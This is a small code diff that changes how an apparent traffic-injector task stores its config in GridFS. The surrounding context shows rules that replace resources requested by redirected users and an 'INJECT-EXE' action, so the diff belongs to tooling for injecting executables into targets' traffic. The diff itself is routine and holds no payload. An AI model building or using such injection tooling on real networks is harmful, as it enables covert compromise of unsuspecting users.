@@ -49,7 +49,7 @@ class InjectorTask
 
       case rule.action
         when 'REPLACE'
-          vector_files[rule.action_param_name] = RCS::DB::GridFS.to_tmp(rule[:_grid].first)
+          vector_files[rule.action_param_name] = RCS::DB::GridFS.to_tmp(rule[:_grid])
           intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{rule.action_param_name} #{rule.resource}"
 
         when 'INJECT-EXE'
@@ -194,10 +194,10 @@ class InjectorTask
     trace :info, "Injector config file size: " + File.size(bin_config_file).to_s
 
     # make sure to delete the old one first
-    GridFS.delete injector[:_grid].first unless injector[:_grid].nil?
+    GridFS.delete injector[:_grid] unless injector[:_grid].nil?
 
     # save the binary config into the grid, it will be requested by NC later
-    injector[:_grid] = [ GridFS.put(File.open(bin_config_file, 'rb+'){|f| f.read}, {filename: injector[:_id].to_s}) ]
+    injector[:_grid] = GridFS.put(File.open(bin_config_file, 'rb+'){|f| f.read}, {filename: injector[:_id].to_s})
     injector[:_grid_size] = File.size(bin_config_file)
 
     # delete the temp file
